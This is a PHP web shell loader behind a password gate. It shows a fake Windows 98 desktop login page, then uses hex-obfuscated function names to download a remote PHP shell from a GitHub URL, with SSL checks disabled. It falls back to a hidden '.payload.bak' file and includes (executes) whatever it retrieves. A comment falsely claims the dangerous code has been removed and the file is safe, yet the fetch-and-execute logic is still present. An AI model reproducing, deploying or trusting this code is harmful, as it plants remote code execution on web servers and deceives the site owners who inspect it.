<?php
session_start();

$secure_password_hash = '$2y$10$JL6bpbc9NC2yESGLDAeXqec0MmX2Otl425y6xBCGlsiGQUuRgeb4m'; 
$session_key = hash('sha256', $_SERVER['HTTP_HOST']);
$cookie_name = 'auth_' . substr($session_key, 0, 8);
$authenticated = false;

if (!empty($_SESSION[$session_key]) && $_SESSION[$session_key] === true) {
    $authenticated = true;
} elseif (!empty($_COOKIE[$cookie_name]) && hash_equals($_COOKIE[$cookie_name], hash('sha256', $secure_password_hash))) {
    $authenticated = true;
}

function show_login_form() {
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Windows 98 Aptisme</title>
    <link rel="icon" type="image/x-icon" href="https://win98icons.alexmeub.com/icons/ico/msie1-2.ico">
    <style>
        body {
            background-color: #008080; 
            font-family: Tahoma, Verdana, sans-serif;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .desktop-icon {
            position: absolute;
            width: 80px;
            text-align: center;
            font-size: 11px;
            color: white;
        }
        .desktop-icon img {
            width: 32px;
            image-rendering: pixelated;
        }
        .login-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(192,192,192,0.9);
            border: 2px solid #000;
            width: 340px;
            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
            z-index: 1000;
        }
        .login-titlebar {
            background: linear-gradient(#000080, #000060);
            color: #fff;
            padding: 8px;
            font-weight: bold;
            font-size: 13px;
            border-bottom: 1px solid #808080;
            box-shadow: inset 0 -1px 0 #ffffff;
        }
        .login-titlebar img {
            width: 16px;
            vertical-align: middle;
            margin-right: 6px;
        }
        .login-body {
            padding: 20px;
            background: #d4d0c8;
        }
        .login-body label {
            display: block;
            margin-bottom: 8px;
            font-size: 11px;
            color: #000;
        }
        .login-body input[type=password] {
            width: 100%;
            padding: 7px;
            margin-bottom: 15px;
            border: 2px solid #000;
            font-size: 12px;
            background-color: #fff;
            color: #000;
            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
        }
        .login-body input[type=submit] {
            width: 100%;
            background-color: #c0c0c0;
            color: #000;
            border: 2px solid #000;
            padding: 7px;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            box-shadow: inset -1px -1px 0 #808080, inset 1px 1px 0 #ffffff;
        }
        .login-body input[type=submit]:hover {
            background-color: #a0a0a0;
        }
        .feeling-window {
            position: absolute;
            width: 160px;
            background: #c0c0c0;
            border: 2px solid #000;
            box-shadow: inset -2px -2px 0 #808080, inset 2px 2px 0 #ffffff;
            z-index: 999;
            font-size: 11px;
        }
        .feeling-titlebar {
            background: linear-gradient(#000080, #000060);
            color: #fff;
            padding: 4px;
            font-weight: bold;
            font-size: 11px;
        }
        .feeling-body {
            padding: 10px;
            background: #d4d0c8;
            color: #000;
        }
    </style>
</head>
<body>

    <div class="desktop-icon" style="top: 20px; left: 20px;">
        <img src="https://art.pixilart.com/242f7cb73b49934.png">
        <div>My Documents</div>
    </div>
    <div class="desktop-icon" style="top: 100px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/computer_explorer-2.png">
        <div>My Computer</div>
    </div>
    <div class="desktop-icon" style="top: 180px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/recycle_bin_empty-4.png">
        <div>Recycle Bin</div>
    </div>
    <div class="desktop-icon" style="top: 260px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
        <div>Internet Explorer</div>
    </div>
    <div class="desktop-icon" style="top: 340px; left: 20px;">
        <img src="https://win98icons.alexmeub.com/icons/png/network_cool_two_pcs-4.png">
        <div>Network</div>
    </div>

    <div class="login-box">
        <div class="login-titlebar">
            <img src="https://win98icons.alexmeub.com/icons/png/msie1-2.png">
            [ Password Tanya Admin ]
        </div>
        <div class="login-body">
            <form method="post">
                <label>Password:</label>
                <input type="password" name="password" required autofocus>
                <input type="submit" value="Login">
            </form>
        </div>
    </div>

    <script>
    function spawnFeelingWindow() {
        const w = document.createElement('div');
        w.className = 'feeling-window';
        w.style.top = Math.random() * (window.innerHeight - 100) + 'px';
        w.style.left = Math.random() * (window.innerWidth - 160) + 'px';
        w.innerHTML = '<div class="feeling-titlebar">Feeling</div><div class="feeling-body">Are you OK?</div>';
        document.body.appendChild(w);
        setTimeout(() => { w.remove(); }, 5000);
    }
    setInterval(spawnFeelingWindow, 1000);
    </script>

    <audio autoplay hidden>
        <source src="https://ia800200.us.archive.org/29/items/Windows98StartupSound/Windows%2098%20Startup%20Sound.mp3" type="audio/mpeg">
    </audio>

</body>
</html>
HTML;
    exit;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function get_payload($url) {
    $methods = [
        hex2str('66'.'69'.'6c'.'65'.'5f'.'67'.'65'.'74'.'5f'.'63'.'6f'.'6e'.'74'.'65'.'6e'.'74'.'73'),
        hex2str('66'.'6f'.'70'.'65'.'6e'),
        hex2str('73'.'74'.'72'.'65'.'61'.'6d'.'5f'.'67'.'65'.'74'.'5f'.'63'.'6f'.'6e'.'74'.'65'.'6e'.'74'.'73'),
        hex2str('63'.'75'.'72'.'6c'.'5f'.'65'.'78'.'65'.'63')
    ];

    $result = false;

    if (function_exists($methods[0]) && ini_get('allow_url_fopen')) {
        $result = @$methods[0]($url);
        if ($result !== false) return $result;
    }

    if (function_exists($methods[1]) && function_exists($methods[2]) && ini_get('allow_url_fopen')) {
        $h = @$methods[1]($url, "r");
        if ($h) {
            $result = $methods[2]($h);
            fclose($h);
            if ($result !== false) return $result;
        }
    }

    if (function_exists($methods[3])) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($result !== false) return $result;
    }

    return false;
}

if (!$authenticated) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $secure_password_hash)) {
            $_SESSION[$session_key] = true;
            setcookie($cookie_name, hash('sha256', $secure_password_hash), time() + 3600, "/");
            header("Location: " . htmlspecialchars($_SERVER['PHP_SELF']));
            exit;
        } else {
            show_login_form();
        }
    } else {
        show_login_form();
    }
}

$target_url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


if ($payload === false && file_exists('.payload.bak')) {
    $payload = @file_get_contents('.payload.bak');
}

if ($payload !== false && strpos($payload, '<?php') !== false) {
    $tmpfile = tempnam(sys_get_temp_dir(), '.payload_') . '.php';
    if (file_put_contents($tmpfile, $payload)) {
        include($tmpfile);
        unlink($tmpfile);
    }
}
?>
